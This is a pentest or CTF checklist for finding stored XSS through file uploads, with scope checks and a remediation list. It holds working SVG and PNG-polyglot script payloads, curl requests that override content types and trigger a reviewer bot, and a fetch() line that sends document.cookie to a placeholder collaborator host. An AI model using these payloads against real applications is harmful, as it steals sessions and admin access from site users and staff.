# Upload XSS Recon Checklist

## Goal

Determine whether uploaded files can execute JavaScript when served back to users or review bots, and capture minimal proof safely.

## 1. Scope Confirmation

- Confirm the target is a lab, owned app, in-scope target, or defensive review.
- Record the target host and time.
- Avoid copying live secrets, tokens, flags, cookies, or private URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
Reviewer bot feature:
```

## 2. Map Upload Surface

Find:

- upload form or `POST /api/upload`
- allowed extensions and size limits
- returned file URL or hash
- binder/gallery/listing endpoint
- reviewer trigger such as `/api/send`, `/api/report`, `/api/review`

Record:

```text
Upload endpoint:
Allowed types:
Returned URL format:
Reviewer endpoint:
```

## 3. Test Accepted And Rejected Types

Try:

```text
.png
.jpg
.svg
.html
.gif
.webp
```

Record:

```text
Accepted:
Rejected error text:
```

## 4. Test SVG Active Content First

Upload:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
```

Fetch stored object:

```bash
curl -i "https://[host]/uploads/[hash].svg"
```

Record:

```text
Content-Type:
Script preserved: yes/no
Served from app origin: yes/no
```

## 4b. Test Parser-Failure SVG When Copy Mentions Unreadable Inputs

If the app hints that some uploads are processed while unreadable ones are "left alone," upload intentionally malformed SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script>
```

Fetch stored object and compare with the well-formed case:

```bash
curl -i "https://[host]/items/[hash].svg"
```

Record:

```text
Parser-failure upload accepted: yes/no
Content-Type changed to text/html: yes/no
Script preserved only on malformed upload: yes/no
```

## 5. Test PNG Polyglot Second

```bash
printf '\x89PNG\r\n\x1a\n<script>document.title="xss"</script>' > proof.png
```

Upload and compare headers:

```bash
curl -I "https://[host]/uploads/[hash].png"
curl -I "https://[host]/uploads/[hash].png?response-content-type=text/html"
```

Record:

```text
Normal Content-Type:
Override Content-Type changed: yes/no
S3/MinIO clues present: yes/no
```

## 6. Identify Reviewer Victim Path

Trigger bot with returned hash, ID, or URL:

```bash
curl -sS -X POST "https://[host]/api/send" \
  -H "Content-Type: application/json" \
  -d '{"hash":"[hash]"}'
```

Record:

```text
Reviewer trigger:
Victim URL visited:
Bot success response:
```

## 7. Prove Impact With Minimal Exfil

Prefer:

```javascript
fetch('https://[collaborator]?c='+encodeURIComponent(document.cookie))
```

If cookies are HttpOnly, pivot to same-origin fetch of admin-only routes.

Record:

```text
Execution proof:
Exfiltrated data type:
Redacted summary:
```

## 8. Separate Upload Validation From Serving Risk

Document:

```text
Upload accepted because ...
Execution happened because file was served as active content from app origin.
```

## 9. Fix Checklist

- Reject or sanitize SVG active content.
- Re-encode raster images server-side.
- Strip object-storage response header overrides.
- Serve uploads from isolated origin.
- Use HttpOnly cookies and non-executing review workflows.

## 10. Decision Checklist

- [ ] Upload endpoints and allowed types identified.
- [ ] SVG script upload tested.
- [ ] Malformed/unreadable SVG parser-failure path tested when relevant.
- [ ] Stored object headers and body inspected.
- [ ] PNG polyglot / override path tested if relevant.
- [ ] Reviewer bot trigger identified.
- [ ] Minimal exfil proof captured.
- [ ] Reusable notes exclude live secrets, tokens, and flags.
